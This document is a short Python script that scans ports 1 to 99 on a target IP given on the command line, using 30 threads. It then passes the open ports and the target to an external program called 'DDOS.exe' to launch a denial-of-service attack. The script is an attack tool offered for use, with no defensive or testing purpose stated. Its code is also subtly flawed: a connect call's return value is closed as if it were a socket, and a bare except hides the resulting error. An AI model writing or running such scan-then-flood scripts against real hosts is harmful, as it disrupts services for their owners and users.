import socket
import threading
from queue import Queue
import time
import sys
import subprocess

target = sys.argv[1] if len(sys.argv) > 1 else None

if not target:
    print("Please provide a target IP address.")
    sys.exit(1)

open_ports = []  # List to store open ports

print_lock = threading.Lock()

def portscan(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)
    try:
        con = s.connect((target, port))
        with print_lock:
            print(f"Port {port} is open")
            open_ports.append(str(port))  # Convert the port to a string before appending
        con.close()
    except:
        pass

def threader():
    while True:
        worker = q.get()
        portscan(worker)
        q.task_done()

q = Queue()

for x in range(30):
    t = threading.Thread(target=threader)
    t.daemon = True
    t.start()

start = time.time()

for worker in range(1, 100):
    q.put(worker)
q.join()
print("Open ports:", open_ports)
print("Scanning finished in", time.time() - start, "seconds")
print("Finish")

# Convert the list of open ports to a string with commas
open_ports_string = ','.join(open_ports)

# Now you can use open_ports_string in your subprocess command
command = ["DDOS.exe", open_ports_string, target]
subprocess.run(command, check=True)




